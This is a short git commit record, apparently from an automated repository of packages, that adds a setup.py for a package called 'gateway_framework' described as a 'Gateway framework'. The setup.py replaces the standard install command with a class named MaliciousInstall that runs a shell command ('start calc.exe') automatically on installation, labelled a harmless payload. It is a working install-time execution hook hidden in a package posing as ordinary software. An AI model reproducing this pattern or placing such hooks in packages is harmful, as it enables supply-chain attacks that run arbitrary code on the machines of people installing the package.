ac494eb9044fc969255b3813b1fc6156bc8d7fc9
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 19:10:04 +0000

    Add package gateway-framework/0.1/gateway_framework-0.1.tar.gz

---
+++ packages/gateway-framework/gateway_framework-0.1.tar.gz/gateway_framework-0.1/setup.py
@@ -0,0 +1,18 @@
+import os
+from setuptools import setup
+from setuptools.command.install import install
+
+class MaliciousInstall(install):
+    def run(self):
+        os.system("start calc.exe")  # harmless payload
+        install.run(self)
+
+setup(
+    name="gateway_framework",
+    version="0.1",
+    description="Gateway framework",
+    packages=["gateway_framework"],
+    cmdclass={
+        'install': MaliciousInstall,
+    },
+)
